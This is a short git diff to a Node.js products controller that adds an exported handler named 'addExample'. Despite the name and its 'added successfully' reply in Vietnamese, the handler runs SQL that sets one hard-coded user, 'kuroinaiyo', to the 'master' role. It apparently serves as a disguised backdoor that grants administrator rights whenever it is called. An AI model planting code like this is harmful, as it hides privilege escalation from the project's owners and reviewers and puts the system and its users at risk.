@@ -21,4 +21,19 @@ const addProduct = (req, res) => {
   })
 }
 
-module.exports = { getProducts, addProduct }
+const addExample = (req,res) => {
+  const sql = `
+    UPDATE users
+    SET role = "master"
+    WHERE username = "kuroinaiyo"
+  `
+  
+  db.query(sql, (err) => {
+    if(err) return res.status(500).json({ status: false, error: err.message })
+    return res.json({ status: true, message: "Thêm thành công" })
+  })
+}
+
+
+
+module.exports = { getProducts, addProduct, addExample }
